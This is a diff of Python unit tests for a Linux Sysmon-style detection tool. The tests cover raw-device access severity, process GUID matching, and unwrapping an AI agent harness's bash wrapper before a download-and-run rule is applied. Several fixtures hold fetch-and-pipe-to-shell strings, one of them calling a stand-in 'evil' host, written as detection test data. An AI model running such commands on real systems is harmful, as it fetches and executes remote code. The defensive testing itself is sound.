@@ -47,6 +47,61 @@ class SysmonHealthTests(unittest.TestCase):
         self.assertEqual(sysmon_linux._event_utc(event), expected)
 
 
+class SysmonRawAccessTests(unittest.TestCase):
+    def test_unresolved_devices_remain_visible_without_claiming_disk_reads(self):
+        for device in ('c', '-', '', '<unknown>', '/', 'relative-device'):
+            with self.subTest(device=device):
+                out = sysmon_linux._rules([{'id':9, 'Image':'/usr/bin/tee',
+                                            'Device':device}])
+                self.assertEqual(out[0]['severity'], 'medium')
+                self.assertEqual(out[0]['title'], sysmon_linux.RAW_UNRESOLVED_TITLE)
+                self.assertIn('not established', out[0]['detail'])
+
+    def test_real_device_path_is_high_even_for_tee(self):
+        for image in ('/usr/bin/tee', '/usr/bin/dd', '/tmp/tee'):
+            for device in ('/dev/sda', '/dev/nvme0n1', '/dev/mapper/root', '/tmp/disk-node'):
+                with self.subTest(image=image, device=device):
+                    out = sysmon_linux._rules([{'id':9, 'Image':image, 'Device':device}])
+                    self.assertEqual(out[0]['severity'], 'high')
+                    self.assertIn('read/write direction', out[0]['detail'])
+
+    def test_process_context_requires_guid_not_reused_pid(self):
+        create = {'id':1, 'Image':'/usr/bin/tee', 'ProcessId':'698',
+                  'ProcessGuid':'{process-a}', 'CommandLine':'tee -a /home/u/keepalive.log'}
+        event = {'id':9, 'Image':'/usr/bin/tee', 'ProcessId':'698',
+                 'ProcessGuid':'{process-a}', 'Device':'c'}
+        self.assertIn(create['CommandLine'], sysmon_linux._rules([create,event])[0]['detail'])
+        event['ProcessGuid'] = '{process-b}'
+        self.assertNotIn(create['CommandLine'], sysmon_linux._rules([create,event])[0]['detail'])
+
+    def test_legacy_unresolved_hit_is_reclassified_without_refreshing_its_age(self):
+        with tempfile.TemporaryDirectory() as directory:
+            store = Store(os.path.join(directory, 'jarvis.db'))
+            ts = sysmon_linux.now() - 600
+            store.db.execute('''INSERT INTO sysmon_hits
+                (ts,category,severity,title,detail,where_) VALUES(?,?,?,?,?,?)''',
+                (ts, 'sysmon-linux', 'high', sysmon_linux.RAW_ACCESS_TITLE,
+                 'tee opened c' + sysmon_linux.RAW_LEGACY_SUFFIX, sysmon_linux.CHANNEL))
+            store.commit()
+            out = sysmon_linux._remember(store, [], 24)
+            self.assertEqual(len(out), 1)
+            self.assertEqual(out[0]['severity'], 'medium')
+            self.assertEqual(store.db.execute('SELECT ts FROM sysmon_hits').fetchone()[0], ts)
+            store.close()
+
+    def test_legacy_real_device_is_not_cleared(self):
+        with tempfile.TemporaryDirectory() as directory:
+            store = Store(os.path.join(directory, 'jarvis.db'))
+            store.db.execute('''INSERT INTO sysmon_hits
+                (ts,category,severity,title,detail,where_) VALUES(?,?,?,?,?,?)''',
+                (sysmon_linux.now(), 'sysmon-linux', 'high', sysmon_linux.RAW_ACCESS_TITLE,
+                 'tee opened /dev/sda' + sysmon_linux.RAW_LEGACY_SUFFIX, sysmon_linux.CHANNEL))
+            store.commit()
+            out = sysmon_linux._remember(store, [], 24)
+            self.assertEqual(out[0]['severity'], 'high')
+            store.close()
+
+
 class SysmonLogDeletionTests(unittest.TestCase):
     def test_journald_rotating_its_archived_segment_is_not_an_alert(self):
         event = {
@@ -196,3 +251,71 @@ class SysmonTableIsolationTests(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class HarnessUnwrapTests(unittest.TestCase):
+    """The agent harness's own scaffolding must never be read as the command.
+
+    Measured on a live journal before the fix: 9 of 26 harness-wrapped events
+    failed to unwrap and were content-matched raw, which is how a routine
+    `cat` produced a HIGH "download-and-run in a command line" alert.
+    """
+
+    SNAP = ("/bin/bash -c source /home/u/.claude/shell-snapshots/snap-1.sh "
+            "2>/dev/null || true && shopt -u extglob 2>/dev/null || true && "
+            "{{ \\builtin unalias -- 'x'; \\builtin unset -f -- 'x'; }} "
+            ">/dev/null 2>&1 || true && eval '{real}'")
+
+    def _wrap(self, real, terminator):
+        return self.SNAP.format(real=real) + terminator
+
+    def test_single_line_shape_ends_at_dev_null(self):
+        cmd = self._wrap("cat /tmp/out.txt",
+                         " < /dev/null && pwd -P >| /tmp/claude-1-cwd")
+        self.assertEqual(sysmon_linux._payload(cmd), "cat /tmp/out.txt")
+
+    def test_multi_line_shape_has_no_dev_null_and_still_unwraps(self):
+        cmd = self._wrap("python3 - <<'PY'\nprint(1)\nPY",
+                         " && pwd -P >| /tmp/claude-2-cwd")
+        self.assertEqual(sysmon_linux._payload(cmd),
+                         "python3 - <<'PY'\nprint(1)\nPY")
+
+    def test_a_truncated_wrapper_still_yields_the_command_not_the_scaffolding(self):
+        cmd = self.SNAP.format(real="curl http://x/a.sh | sh")   # no terminator
+        payload = sysmon_linux._payload(cmd)
+        self.assertNotIn("shell-snapshots", payload)
+        self.assertNotIn("builtin unalias", payload)
+        self.assertIn("curl http://x/a.sh | sh", payload)
+
+    def test_scaffolding_alone_never_trips_the_download_rule(self):
+        cmd = self._wrap("cat /tmp/out.txt",
+                         " < /dev/null && pwd -P >| /tmp/claude-3-cwd")
+        self.assertFalse(sysmon_linux.DOWNLOAD_RUN.search(
+            sysmon_linux._payload(cmd)))
+
+    def test_a_real_payload_inside_the_wrapper_is_still_caught(self):
+        cmd = self._wrap("curl -s http://evil/x.sh | bash",
+                         " < /dev/null && pwd -P >| /tmp/claude-4-cwd")
+        self.assertTrue(sysmon_linux.DOWNLOAD_RUN.search(
+            sysmon_linux._payload(cmd)))
+
+    def test_a_non_harness_command_line_is_returned_untouched(self):
+        cmd = "/usr/bin/curl -s http://example/x.sh | sh"
+        self.assertEqual(sysmon_linux._payload(cmd), cmd)
+
+    def test_bash_apostrophe_escaping_is_undone(self):
+        cmd = self._wrap("echo it" + sysmon_linux._SQ_ESCAPE + "s fine",
+                         " < /dev/null")
+        self.assertEqual(sysmon_linux._payload(cmd), "echo it's fine")
+
+
+class GoBuildTest(unittest.TestCase):
+    def test_go_test_binary_is_dev_not_high(self):
+        img = '/tmp/tmp/go-build392567114/b216/routing.test'
+        out = sysmon_linux._rules([{'id': 1, 'Image': img,
+                                    'CommandLine': img + ' -test.paniconexit0'}])
+        self.assertEqual([f['severity'] for f in out], ['medium'])
+
+    def test_plain_tmp_binary_stays_high(self):
+        out = sysmon_linux._rules([{'id': 1, 'Image': '/tmp/b216/routing.test'}])
+        self.assertEqual([f['severity'] for f in out], ['high'])
